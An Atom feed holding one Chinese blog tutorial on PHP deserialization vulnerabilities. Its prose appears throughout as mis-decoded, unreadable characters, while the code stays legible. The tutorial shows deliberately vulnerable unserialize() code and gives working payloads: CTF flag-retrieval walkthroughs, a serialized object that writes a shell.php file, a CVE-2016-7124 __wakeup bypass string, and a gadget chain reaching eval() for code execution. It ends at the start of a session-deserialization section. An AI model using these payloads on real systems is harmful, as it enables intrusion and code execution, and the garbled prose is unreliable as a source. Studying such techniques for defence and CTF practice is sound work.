<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://outlaws-bai.github.io</id>
    <title>outlaws&apos; blog</title>
    <updated>2021-03-18T05:02:39.359Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://outlaws-bai.github.io"/>
    <link rel="self" href="https://outlaws-bai.github.io/atom.xml"/>
    <subtitle>ç”Ÿå¦‚é€†æ—…ï¼Œä¸€è‹‡ä»¥èˆªã€‚</subtitle>
    <logo>https://outlaws-bai.github.io/images/avatar.png</logo>
    <icon>https://outlaws-bai.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, outlaws&apos; blog</rights>
    <entry>
        <title type="html"><![CDATA[phpåºåˆ—åŒ–ä¸ååºåˆ—åŒ–]]></title>
        <id>https://outlaws-bai.github.io/post/php-serialize&amp;unserialize/</id>
        <link href="https://outlaws-bai.github.io/post/php-serialize&amp;unserialize/">
        </link>
        <updated>2021-03-18T03:59:36.000Z</updated>
        <content type="html"><![CDATA[<h1 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–">åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h1>
<h2 id="åºåˆ—åŒ–">åºåˆ—åŒ–</h2>
<p>å®šä¹‰ï¼šåˆ©ç”¨<code>serialize()</code>å‡½æ•°å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²å½¢å¼<br>
æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ç›´æ¥è¾“å‡ºå¯¹è±¡æ˜¯ä»€ä¹ˆæ•ˆæœï¼Œä»£ç å¦‚ä¸‹</p>
<pre><code>&lt;?php
    class test{
        public $name=&quot;ghtwf01&quot;;
        public $age=&quot;18&quot;;
    }
    $a=new test();
    print_r($a);
?&gt;
</code></pre>
<p>æ•ˆæœå¦‚ä¸‹<br>
<a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144212-8e85e4f4-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144212-8e85e4f4-0517-1.png" alt="img" loading="lazy"></a><br>
è¿™ä¸ªæ—¶å€™æˆ‘ä»¬åˆ©ç”¨<code>serialize()</code>å‡½æ•°å°†è¿™ä¸ªå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æˆå­—ç¬¦ä¸²ç„¶åè¾“å‡ºï¼Œä»£ç å¦‚ä¸‹</p>
<pre><code>&lt;?php
    class test{
        public $name=&quot;ghtwf01&quot;;
        public $age=&quot;18&quot;;
    }
    $a=new test();
    $a=serialize($a);
    print_r($a);
?&gt;
</code></pre>
<p>æ•ˆæœå¦‚ä¸‹</p>
<figure data-type="image" tabindex="1"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144234-9c15d5ca-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144234-9c15d5ca-0517-1.png" alt="img" loading="lazy"></a></figure>
<p>å¦‚æœä¸æ˜¯<code>public</code>æ–¹æ³•é‚£ä¹ˆåé¢çš„è¯»å–æ–¹æ³•å°±æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œä¾‹å¦‚ä»£ç å¦‚ä¸‹</p>
<pre><code>&lt;?php
    class test{
        public $name=&quot;ghtwf01&quot;;
        private $age=&quot;18&quot;;
        protected $sex=&quot;man&quot;;
    }
    $a=new test();
    $a=serialize($a);
    print_r($a);
?&gt;
</code></pre>
<p>æ•ˆæœå¦‚ä¸‹</p>
<figure data-type="image" tabindex="2"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144245-a2973722-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144245-a2973722-0517-1.png" alt="img" loading="lazy"></a></figure>
<p>privateåˆ†æï¼š<br>
è¿™æ ·å°±å‘ç°æœ¬æ¥æ˜¯<code>age</code>ç»“æœä¸Šé¢å‡ºç°çš„æ˜¯<code>testage</code>ï¼Œè€Œä¸”<code>testage</code>é•¿åº¦ä¸º<code>7</code>ï¼Œä½†æ˜¯ä¸Šé¢æ˜¾ç¤ºçš„æ˜¯<code>9</code><br>
æŸ¥æ‰¾èµ„æ–™åå‘ç°<strong>privateå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯%00ç±»å%00æˆå‘˜å</strong>ï¼Œ<code>%00</code>å ä¸€ä¸ªå­—èŠ‚é•¿åº¦ï¼Œæ‰€ä»¥<code>age</code>åŠ äº†ç±»ååå˜æˆäº†<code>testage</code>é•¿åº¦ä¸º<code>9</code></p>
<p>protectåˆ†æï¼š<br>
æœ¬æ¥æ˜¯<code>sex</code>ç»“æœä¸Šé¢å‡ºç°çš„æ˜¯<code>*sex</code>ï¼Œè€Œä¸”<code>*sex</code>çš„é•¿åº¦æ˜¯<code>4</code>ï¼Œä½†æ˜¯ä¸Šé¢æ˜¾ç¤ºçš„æ˜¯<code>6</code>ï¼ŒåŒæ ·æŸ¥æ‰¾èµ„æ–™åå‘ç°<strong>protectå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯%00*%00æˆå‘˜å</strong></p>
<p>è¿™é‡Œä»‹ç»ä¸€ä¸‹publicã€privateã€protectedçš„åŒºåˆ«</p>
<pre><code>public(å…¬å…±çš„):åœ¨æœ¬ç±»å†…éƒ¨ã€å¤–éƒ¨ç±»ã€å­ç±»éƒ½å¯ä»¥è®¿é—®

protect(å—ä¿æŠ¤çš„):åªæœ‰æœ¬ç±»æˆ–å­ç±»æˆ–çˆ¶ç±»ä¸­å¯ä»¥è®¿é—®

private(ç§äººçš„):åªæœ‰æœ¬ç±»å†…éƒ¨å¯ä»¥ä½¿ç”¨
</code></pre>
<h2 id="ååºåˆ—åŒ–">ååºåˆ—åŒ–</h2>
<p>å®šä¹‰ï¼šååºåˆ—åŒ–å°±æ˜¯åˆ©ç”¨<code>unserailize()</code>å‡½æ•°å°†ä¸€ä¸ªç»è¿‡åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸæˆphpä»£ç å½¢å¼ï¼Œä»£ç å¦‚ä¸‹</p>
<pre><code>&lt;?php
    $b='åºåˆ—åŒ–å­—ç¬¦ä¸²';
    $b=unserialize($b);
?&gt;
</code></pre>
<h1 id="ååºåˆ—åŒ–æ¼æ´åŸç†">ååºåˆ—åŒ–æ¼æ´åŸç†</h1>
<p>åˆ°è¿™å„¿ä¹Ÿè®¸å¤§å®¶ä¼šæƒ³ç€åºåˆ—åŒ–è¿‡å»å†ååºåˆ—åŒ–å›æ¥ï¼Œä¸å°±æ˜¯å½¢å¼ä¹‹é—´çš„è½¬æ¢å—ï¼Œå’Œæ¼æ´æœ‰ä»€ä¹ˆå…³ç³»<br>
è¿™é‡Œå…ˆæŒæ¡phpå¸¸è§çš„é­”æœ¯æ–¹æ³•ï¼Œå…ˆåˆ—å‡ºå‡ ä¸ªæœ€å¸¸è§çš„é­”æœ¯æ–¹æ³•ï¼Œå½“é‡åˆ°è¿™äº›çš„æ—¶å€™å°±éœ€è¦æ³¨æ„äº†<br>
é™„ä¸Šè®²è§£é­”æœ¯æ–¹æ³•çš„é“¾æ¥ï¼šhttps://segmentfault.com/a/1190000007250604</p>
<pre><code>__construct()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨

__destruct()å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨

__toString()ç±»è¢«å½“åšå­—ç¬¦ä¸²ä½¿ç”¨æ—¶çš„å›åº”æ–¹æ³•

__sleep() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ

__wakeupå°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨
</code></pre>
<p>æˆ‘ä»¬ç”¨ä»£ç æ¼”ç¤ºä¸€ä¸‹è¿™äº›é­”æœ¯æ–¹æ³•çš„ä½¿ç”¨æ•ˆæœ</p>
<pre><code>&lt;?php
    class test{
        public $a='hacked by ghtwf01';
        public $b='hacked by blckder02';
        public function pt(){
            echo $this-&gt;a.'&lt;br /&gt;';
        }
        public function __construct(){
            echo '__construct&lt;br /&gt;';
        }
        public function __destruct(){
            echo '__construct&lt;br /&gt;';
        }
        public function __sleep(){
            echo '__sleep&lt;br /&gt;';
            return array('a','b');
        }
        public function __wakeup(){
            echo '__wakeup&lt;br /&gt;';
        }
    }
    //åˆ›å»ºå¯¹è±¡è°ƒç”¨__construct
    $object = new test();
    //åºåˆ—åŒ–å¯¹è±¡è°ƒç”¨__sleep
    $serialize = serialize($object);
    //è¾“å‡ºåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²
    echo 'serialize: '.$serialize.'&lt;br /&gt;';
    //ååºåˆ—åŒ–å¯¹è±¡è°ƒç”¨__wakeup
    $unserialize=unserialize($serialize);
    //è°ƒç”¨ptè¾“å‡ºæ•°æ®
    $unserialize-&gt;pt();
    //è„šæœ¬ç»“æŸè°ƒç”¨__destruct
?&gt;
</code></pre>
<p>è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p>
<figure data-type="image" tabindex="3"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144317-b5673690-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144317-b5673690-0517-1.png" alt="img" loading="lazy"></a></figure>
<p>åŸæ¥æœ‰ä¸€ä¸ªå®ä¾‹åŒ–å‡ºçš„å¯¹è±¡ï¼Œç„¶ååˆååºåˆ—åŒ–å‡ºäº†ä¸€ä¸ªå¯¹è±¡ï¼Œå°±å­˜åœ¨ä¸¤ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥æœ€åé”€æ¯äº†ä¸¤ä¸ªå¯¹è±¡ä¹Ÿå°±å‡ºç°äº†æ‰§è¡Œäº†ä¸¤æ¬¡<code>__destruct</code></p>
<p>è¿™é‡Œæˆ‘ä»¬çœ‹ä¸€ä¸ªå­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„ä»£ç </p>
<pre><code>&lt;?php
class A{
    public $test = &quot;demo&quot;;
    function __destruct(){
            echo $this-&gt;test;
    }
}
$a = $_GET['value'];
$a_unser = unserialize($a);
?&gt;
</code></pre>
<p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªååºåˆ—åŒ–ä»£ç ï¼Œåˆ©ç”¨æ–¹æ³•æ˜¯å°†éœ€è¦ä½¿ç”¨çš„ä»£ç åºåˆ—åŒ–åä¼ å…¥ï¼Œçœ‹åˆ°è¿™æ®µä»£ç ä¸Šé¢æœ‰<code>echo</code>ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹åœ¨è¿™ä¸ªé¡µé¢æ˜¾ç¤º<code>hacked by ghtwf01</code>çš„å­—ç¬¦ï¼Œç°åœ¨ä¸€è¾¹å°†è¿™æ®µå­—ç¬¦ä¸²è¿›è¡Œåºåˆ—åŒ–ï¼Œä»£ç å¦‚ä¸‹(è¿™é‡Œçš„ç±»åå’Œå¯¹è±¡åè¦å’Œå­˜åœ¨æ¼æ´çš„ä»£ç ä¸€è‡´ï¼Œç±»åä¸º<code>A</code>,å¯¹è±¡åä¸º<code>test</code>)</p>
<pre><code>&lt;?php
    class A{
        public $test=&quot;hacked by ghtwf01&quot;;
    }
    $b= new A();
    $result=serialize($b);
    print_r($result);
?&gt;
</code></pre>
<p>è¿™æ ·å°±å¾—åˆ°è¿™æ®µå­—ç¬¦åºåˆ—åŒ–åçš„å†…å®¹</p>
<figure data-type="image" tabindex="4"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144328-bc4e7b80-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144328-bc4e7b80-0517-1.png" alt="img" loading="lazy"></a></figure>
<p>å°†å®ƒä¼ å…¥ç›®æ ‡ç½‘é¡µï¼Œè¿”å›ç»“æœå¦‚ä¸‹</p>
<figure data-type="image" tabindex="5"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144337-c162628a-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144337-c162628a-0517-1.png" alt="img" loading="lazy"></a></figure>
<p>æ—¢ç„¶ç½‘é¡µä¸Šèƒ½è¾“å‡ºï¼Œé‚£è¯´æ˜ä¹Ÿå¯ä»¥è¿›è¡ŒXSSæ”»å‡»ï¼Œå°è¯•ä¸€ä¸‹ï¼Œè™½ç„¶æœ‰ç‚¹é¸¡è‚‹2333ï¼Œåˆ°è¿™é‡Œåº”è¯¥æ‡‚å¾—ç‚¹ä»€ä¹ˆå«ååºåˆ—åŒ–æ¼æ´äº†</p>
<figure data-type="image" tabindex="6"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144342-c4a63282-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144342-c4a63282-0517-1.png" alt="img" loading="lazy"></a></figure>
<p>ä¸€é“ç®€å•çš„ååºåˆ—åŒ–è€ƒç‚¹é¢˜<br>
http://120.79.33.253:9001/</p>
<pre><code>&lt;?php
error_reporting(0);
include &quot;flag.php&quot;;
$KEY = &quot;D0g3!!!&quot;;
$str = $_GET['str'];
if (unserialize($str) === &quot;$KEY&quot;)
{
    echo &quot;$flag&quot;;
}
show_source(__FILE__);
</code></pre>
<p>é¢˜ç›®çš„å¤§æ„å°±æ˜¯ååºåˆ—åŒ–ä¸€ä¸ªå˜é‡åçš„å€¼ç­‰äº<code>D0g3!!!</code>ï¼Œè¿™ä¸ªå˜é‡æ˜¯ç”¨æˆ·è¾“å…¥çš„ï¼Œäºæ˜¯æˆ‘ä»¬å†™ä»£ç å°†<code>D0g3!!!</code>åºåˆ—åŒ–</p>
<pre><code>&lt;?php
    $a=&quot;D0g3!!!&quot;;
    $b=serialize($a);
    echo $b;
?&gt;
</code></pre>
<p>å¾—åˆ°åºåˆ—åŒ–åçš„å†…å®¹æ˜¯</p>
<figure data-type="image" tabindex="7"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144356-ccd49fe8-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144356-ccd49fe8-0517-1.png" alt="img" loading="lazy"></a></figure>
<p>å°†åºåˆ—åŒ–åçš„å†…å®¹ä¼ å…¥å¾—åˆ°flag</p>
<figure data-type="image" tabindex="8"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144404-d13ff460-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144404-d13ff460-0517-1.png" alt="img" loading="lazy"></a></figure>
<p>ç°åœ¨å†æ¥ä¸€é“bugkuçš„ååºåˆ—åŒ–é¢˜<br>
welcome to bugctf(è¿™é“é¢˜è¢«æ¶æçš„åˆ äº†qwqï¼Œåªå¥½çœ‹çœ‹ç½‘ä¸Šè´´å‡ºçš„ä»£ç åˆ†æä¸€ä¸‹)</p>
<p>index.php</p>
<pre><code>&lt;?php  

$txt = $_GET[&quot;txt&quot;];  

$file = $_GET[&quot;file&quot;];  

$password = $_GET[&quot;password&quot;];  

if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')===&quot;welcome to the bugkuctf&quot;)){  

    echo &quot;hello friend!&lt;br&gt;&quot;;  

    if(preg_match(&quot;/flag/&quot;,$file)){ 

        echo &quot;ä¸èƒ½ç°åœ¨å°±ç»™ä½ flagå“¦&quot;;

        exit();  

    }else{  

        include($file);   

        $password = unserialize($password);  

        echo $password;  

    }  

}else{  

    echo &quot;you are not the number of bugku ! &quot;;  

}  

?&gt;
</code></pre>
<p>ä»£ç æœ‰ç‚¹é•¿æˆ‘ä»¬å…ˆæ¥åˆ†æä¸€ä¸‹è¿™ä¸²ä»£ç æƒ³è¡¨è¾¾ä»€ä¹ˆ<br>
1.å…ˆ<code>GET</code>ä¼ å…¥å‚æ•°<code>$txt</code>ã€<code>$file</code>ã€<code>$password</code><br>
2.åˆ¤æ–­<code>$txt</code>æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨å¹¶ä¸”å€¼ä¸º<code>welcome to the bugkuctf</code>å°±è¿›ä¸€æ­¥æ“ä½œï¼Œ<code>$file</code>å‚æ•°é‡Œé¢ä¸èƒ½åŒ…å«<code>flag</code>å­—æ®µ<br>
3.é€šè¿‡ä»¥ä¸Šåˆ¤æ–­å°±<code>include($file)</code>ï¼Œå†å°†<code>$password</code>ååºåˆ—åŒ–å¹¶è¾“å‡º</p>
<p>hint.php</p>
<pre><code>&lt;?php   

class Flag{//flag.php  

    public $file;  

    public function __tostring(){  

        if(isset($this-&gt;file)){  

            echo file_get_contents($this-&gt;file); 

            echo &quot;&lt;br&gt;&quot;;

        return (&quot;good&quot;);

        }  

    }  

}  

?&gt;
index.php`é‡Œé¢è¦æ±‚`$file`å‚æ•°ä¸èƒ½åŒ…å«`flag`å­—æ®µï¼Œæ‰€ä»¥æ–‡ä»¶ä¸èƒ½åŒ…å«`flag.php`ï¼Œæ‰€ä»¥`$file=hint.php`ï¼ŒæŠŠ`hint.php`åŒ…å«è¿›å»ï¼Œé‡Œé¢å­˜åœ¨ä¸€ä¸ª`file_get_concentså‡½æ•°`å¯ä»¥è¯»æ–‡ä»¶ï¼Œæƒ³åˆ°`index.php`é‡Œé¢çš„`unserialize`å‡½æ•°ï¼Œæ‰€ä»¥åªéœ€è¦æ§åˆ¶`$this-&gt;file`å°±èƒ½è¯»å–æƒ³è¦çš„æ–‡ä»¶
ç”¨è¿™æ®µä»£ç çš„ç»“æœä¼ å€¼ç»™`$password
&lt;?php
    class Flag{
        public $file='flag.php';
    }
    $a=new Flag();
    $b=serialize($a);
    echo $b;
?&gt;
$password`è¿›è¡Œååºåˆ—åŒ–å`$file`å°±è¢«èµ‹å€¼ä¸º`flag.php`ï¼Œç„¶å`file_get_contents`å°±å¾—åˆ°äº†`flag
</code></pre>
<figure data-type="image" tabindex="9"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144423-dd119f00-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144423-dd119f00-0517-1.png" alt="img" loading="lazy"></a></figure>
<p>å†æ¥ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ä¾‹å­ï¼Œä»£ç å¦‚ä¸‹</p>
<pre><code>&lt;?php
    class foo{
        public $file = &quot;2.txt&quot;;
        public $data = &quot;test&quot;;
        function __destruct(){
            file_put_contents(dirname(__FILE__).'/'.$this-&gt;file,$this-&gt;data);
        }
    }
    $file_name = $_GET['filename'];
    print &quot;You have readfile &quot;.$file_name;
    unserialize(file_get_contents($file_name));
?&gt;
</code></pre>
<p>è¿™ä¸²ä»£ç çš„æ„æ€æ˜¯å°†è¯»å–çš„æ–‡ä»¶å†…å®¹è¿›è¡Œååºåˆ—åŒ–ï¼Œ<code>__destruct</code>å‡½æ•°é‡Œé¢æ˜¯ç”Ÿæˆæ–‡ä»¶ï¼Œå¦‚æœæˆ‘ä»¬æœ¬åœ°å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åæ˜¯<code>flag.txt</code>ï¼Œé‡Œé¢çš„å†…å®¹æ˜¯</p>
<pre><code>O:3:&quot;foo&quot;:2:{s:4:&quot;file&quot;;s:9:&quot;shell.php&quot;;s:4:&quot;data&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;}
</code></pre>
<p>å°†å®ƒè¿›è¡Œååºåˆ—åŒ–å°±ä¼šç”Ÿæˆ<code>shell.php</code>é‡Œé¢çš„å†…å®¹ä¸º<code>&lt;?php phpinfo();?&gt;</code></p>
<figure data-type="image" tabindex="10"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144432-e1ef4f90-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144432-e1ef4f90-0517-1.png" alt="img" loading="lazy"></a></figure>
<figure data-type="image" tabindex="11"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144444-e95a626a-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144444-e95a626a-0517-1.png" alt="img" loading="lazy"></a></figure>
<h1 id="cve-2016-7124-__wakeupç»•è¿‡">CVE-2016-7124 __wakeupç»•è¿‡</h1>
<p><strong>__wakeupé­”æ³•å‡½æ•°ç®€ä»‹</strong><br>
<code>unserialize()</code>ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª <code>__wakeup()</code> æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ <code>__wakeup()</code> æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æº<br>
ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœè¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡<code>__wakeup()</code>çš„æ‰§è¡Œ<br>
<strong>æ¼æ´å½±å“ç‰ˆæœ¬ï¼š</strong><br>
php5 &lt; 5.6.25<br>
php7 &lt; 7.0.10<br>
<strong>æ¼æ´å¤ç°ï¼š</strong><br>
ä»£ç å¦‚ä¸‹</p>
<pre><code>&lt;?php
    class A{
        public $target = &quot;test&quot;;
        function __wakeup(){
            $this-&gt;target = &quot;wakeup!&quot;;
        }
        function __destruct(){
            $fp = fopen(&quot;D:\Program Files\PHPTutorial\WWW\zx\hello.php&quot;,&quot;w&quot;);
            fputs($fp,$this-&gt;target);
            fclose($fp);
        }
    }
    $a = $_GET['test'];
    $b = unserialize($a);
    echo &quot;hello.php&quot;.&quot;&lt;br/&gt;&quot;;
    include(&quot;./hello.php&quot;);
?&gt;
</code></pre>
<p>é­”æ³•å‡½æ•°<code>__wakeup()</code>è¦æ¯”<code>__destruct()</code>å…ˆæ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹‹é—´ä¼ å…¥<br>
<code>O:1:&quot;A&quot;:1:{s:6:&quot;target&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;}</code><br>
æ—¶ä¼šè¢«å…ˆæ‰§è¡Œçš„<code>__wakeup()</code>å‡½æ•°<code>$target</code>èµ‹å€¼è¦†ç›–ä¸º<code>wakeup!</code>ï¼Œç„¶åç”Ÿæˆçš„<code>hello.php</code>é‡Œé¢çš„å†…å®¹å°±æ˜¯<code>wakeup!</code></p>
<figure data-type="image" tabindex="12"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144453-eebf630e-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144453-eebf630e-0517-1.png" alt="img" loading="lazy"></a></figure>
<p>ç°åœ¨æˆ‘ä»¬æ ¹æ®ç»•è¿‡æ–¹æ³•ï¼šå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡<code>__wakeup()</code>çš„æ‰§è¡Œï¼Œå¯¹è±¡ä¸ªæ•°åŸæ¥æ˜¯1æˆ‘ä»¬å°†å…¶æ”¹ä¸º2ï¼Œä¹Ÿå°±æ˜¯<br>
<code>O:2:&quot;A&quot;:1:{s:6:&quot;target&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;}</code><br>
å°±èƒ½å®ç°ç»•è¿‡</p>
<figure data-type="image" tabindex="13"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144459-f23fd856-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144459-f23fd856-0517-1.png" alt="img" loading="lazy"></a></figure>
<h1 id="æ³¨å…¥å¯¹è±¡æ„é€ æ–¹æ³•">æ³¨å…¥å¯¹è±¡æ„é€ æ–¹æ³•</h1>
<h2 id="å½“ç›®æ ‡å¯¹è±¡è¢«private-protectedä¿®é¥°æ—¶ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨">å½“ç›®æ ‡å¯¹è±¡è¢«privateã€protectedä¿®é¥°æ—¶ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨</h2>
<p>ä¸Šé¢è¯´äº†<code>private</code>å’Œ<code>protected</code>è¿”å›é•¿åº¦å’Œ<code>public</code>ä¸ä¸€æ ·çš„åŸå› ï¼Œè¿™é‡Œå†å†™ä¸€ä¸‹</p>
<pre><code>privateå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯%00ç±»å%00æˆå‘˜å
protectå±æ€§åºåˆ—åŒ–çš„æ—¶å€™æ ¼å¼æ˜¯%00*%00æˆå‘˜å
</code></pre>
<p><code>protected</code>æƒ…å†µä¸‹ï¼Œä»£ç å¦‚ä¸‹</p>
<pre><code>&lt;?php
    class A{
        protected $test = &quot;hahaha&quot;;
        function __destruct(){
            echo $this-&gt;test;
        }
    }
    $a = $_GET['test'];
    $b = unserialize($a);
?&gt;
</code></pre>
<p>åˆ©ç”¨æ–¹å¼ï¼š<br>
å…ˆç”¨å¦‚ä¸‹ä»£ç è¾“å‡ºåˆ©ç”¨çš„åºåˆ—åŒ–ä¸²</p>
<pre><code>&lt;?php
    class A{
        protected $test = &quot;hacked by ghtwf01&quot;;
    }
    $a = new A();
    $b = serialize($a);
    print_r($b);
?&gt;
</code></pre>
<p>å¾—åˆ°<code>O:1:&quot;A&quot;:1:{s:7:&quot;*test&quot;;s:17:&quot;hacked by ghtwf01&quot;;}</code><br>
å› ä¸º<code>protected</code>æ˜¯<code>*</code>å·ä¸¤è¾¹éƒ½æœ‰<code>%00</code>ï¼Œæ‰€ä»¥å¿…é¡»åœ¨<code>url</code>ä¸Šé¢ä¹ŸåŠ ä¸Šï¼Œå¦åˆ™ä¸ä¼šåˆ©ç”¨æˆåŠŸ</p>
<figure data-type="image" tabindex="14"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144507-f7487f88-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144507-f7487f88-0517-1.png" alt="img" loading="lazy"></a></figure>
<p><code>private</code>æƒ…å†µä¸‹ï¼Œä»£ç å¦‚ä¸‹</p>
<pre><code>&lt;?php
    class A{
        private $test = &quot;hacked by ghtwf01&quot;;
    }
    $a = new A();
    $b = serialize($a);
    print_r($b);
?&gt;
</code></pre>
<p>åˆ©ç”¨ä»£ç è¿™é‡Œçœç•¥å§ï¼ŒåŒä¸Šé¢ï¼Œå¾—åˆ°åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸º<code>O:1:&quot;A&quot;:1:{s:7:&quot;Atest&quot;;s:17:&quot;hacked by ghtwf01&quot;;</code><br>
å› ä¸º<code>private</code>æ˜¯ç±»å<code>A</code>ä¸¤è¾¹éƒ½æœ‰<code>%00</code>æ‰€ä»¥åŒæ ·åœ¨<code>url</code>ä¸Šé¢ä½“ç°</p>
<figure data-type="image" tabindex="15"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144513-fa534faa-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144513-fa534faa-0517-1.png" alt="img" loading="lazy"></a></figure>
<h2 id="åŒåæ–¹æ³•çš„åˆ©ç”¨">åŒåæ–¹æ³•çš„åˆ©ç”¨</h2>
<p>ä»£ç å¦‚ä¸‹</p>
<pre><code>&lt;?php
    class A{
        public $target;
        function __construct(){
            $this-&gt;target = new B;
        }
        function __destruct(){
            $this-&gt;target-&gt;action();
        }
    }
    class B{
        function action(){
            echo &quot;action B&quot;;
        }
    }
    class C{
        public $test;
        function action(){
            echo &quot;action A&quot;;
            eval($this-&gt;test);
        }
    }
    unserialize($_GET['test']);
?&gt;
</code></pre>
<p>è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>class B</code>å’Œ<code>class C</code>æœ‰ä¸€ä¸ªåŒåæ–¹æ³•<code>action</code>ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ç›®æ ‡å¯¹è±¡ï¼Œä½¿å¾—ææ„å‡½æ•°è°ƒç”¨<code>class C</code>çš„<code>action</code>æ–¹æ³•ï¼Œå®ç°ä»»æ„ä»£ç æ‰§è¡Œ<br>
åˆ©ç”¨ä»£ç </p>
<pre><code>&lt;?php
    class A{
        public $target;
        function __construct(){
            $this-&gt;target = new C;
            $this-&gt;target-&gt;test = &quot;phpinfo();&quot;;
        }
        function __destruct(){
            $this-&gt;target-&gt;action();
        }
    }
    class C{
        public $test;
        function action(){
            echo &quot;action C&quot;;
            eval($this-&gt;test);
        }
    }
    echo serialize(new A);
?&gt;
</code></pre>
<figure data-type="image" tabindex="16"><a href="https://xzfile.aliyuncs.com/media/upload/picture/20191112144521-ff4ec48a-0517-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144521-ff4ec48a-0517-1.png" alt="img" loading="lazy"></a></figure>
<h1 id="sessionååºåˆ—åŒ–æ¼æ´">sessionååºåˆ—åŒ–æ¼æ´</h1>
<h2 id="ä»€ä¹ˆæ˜¯session">ä»€ä¹ˆæ˜¯session</h2>
